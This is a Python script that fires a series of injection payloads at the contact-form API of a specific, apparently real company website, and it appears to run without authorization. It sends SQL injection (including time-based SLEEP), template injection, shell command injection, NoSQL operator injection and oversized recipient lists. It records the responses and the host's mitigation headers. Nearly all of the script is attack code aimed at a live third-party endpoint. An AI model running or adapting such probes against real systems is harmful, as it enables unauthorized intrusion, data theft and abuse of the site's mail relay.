import subprocess, time, json

B = "https://www.infinitycapital.bh/api/send"
MAIL = "probe@www.infinitycapital.bh"

def post(fields, files=None, extra=None):
    cmd = ["curl","-s","-o","/tmp/q.bin","-D","/tmp/q.hdr","-m","30","-X","POST",B]
    for k,v in fields.items():
        cmd += ["-F", f"{k}={v}"]
    for k,(fn,ct,data) in (files or {}).items():
        cmd += ["-F", f"{k}=@{fn};type={ct}"]
    subprocess.run(cmd, capture_output=True, text=True)
    hdr = open("/tmp/q.hdr", errors="ignore").read()
    body = open("/tmp/q.bin","rb").read()
    st = hdr.splitlines()[0] if hdr else "NONE"
    srv = [l for l in hdr.splitlines() if l.lower().startswith("x-vercel-mitigated")]
    return st, len(body), body[:400], srv

base = {"fname":"Test","lname":"User","areacode":"973","tel":"1234567",
        "cname":"Test User","subject":"Inquiry","msg":"hello there","check":"","targets":"[]"}

print("### 1 BASELINE multipart")
print(post(base), flush=True); time.sleep(1)

print("### 2 NO targets")
b2 = dict(base); b2["targets"]=""
print(post(b2), flush=True); time.sleep(1)

print("### 3 targets as array json")
b3 = dict(base); b3["targets"]=json.dumps([{"name":"t","email":MAIL}])
print(post(b3), flush=True); time.sleep(1)

print("### 4 targets id array")
b4 = dict(base); b4["targets"]=json.dumps(["t1","t2"])
print(post(b4), flush=True); time.sleep(1)

print("### 5 SQLI in msg")
b5 = dict(base); b5["msg"]="' OR '1'='1"
print(post(b5), flush=True); time.sleep(1)

print("### 6 SQLI in fname")
b6 = dict(base); b6["fname"]="' OR 1=1-- -"
print(post(b6), flush=True); time.sleep(1)

print("### 7 SQLi UNION in msg")
b7 = dict(base); b7["msg"]="x' UNION SELECT null,null,null-- -"
print(post(b7), flush=True); time.sleep(1)

print("### 8 SSTI in msg")
b8 = dict(base); b8["msg"]="{{7*7}}${7*7}<%=7*7%>#{7*7}"
print(post(b8), flush=True); time.sleep(1)

print("### 9 CMDi in msg")
b9 = dict(base); b9["msg"]=";id;$(id)`id`"
print(post(b9), flush=True); time.sleep(1)

print("### 10 NoSQLi targets")
b10 = dict(base); b10["targets"]=json.dumps({"$ne":None})
print(post(b10), flush=True); time.sleep(1)

print("### 11 targets huge")
b11 = dict(base); b11["targets"]=json.dumps([{"name":"A"*100,"email":MAIL} for _ in range(200)])
print(post(b11), flush=True); time.sleep(1)

print("### 12 check=1")
b12 = dict(base); b12["check"]="1"
print(post(b12), flush=True); time.sleep(1)

print("### 13 subject sqli")
b13 = dict(base); b13["subject"]="' AND SLEEP(5)-- -"
import time as _t
s=_t.time(); r=post(b13); print("sleep5 elapsed=%.1f" % (_t.time()-s), r, flush=True)
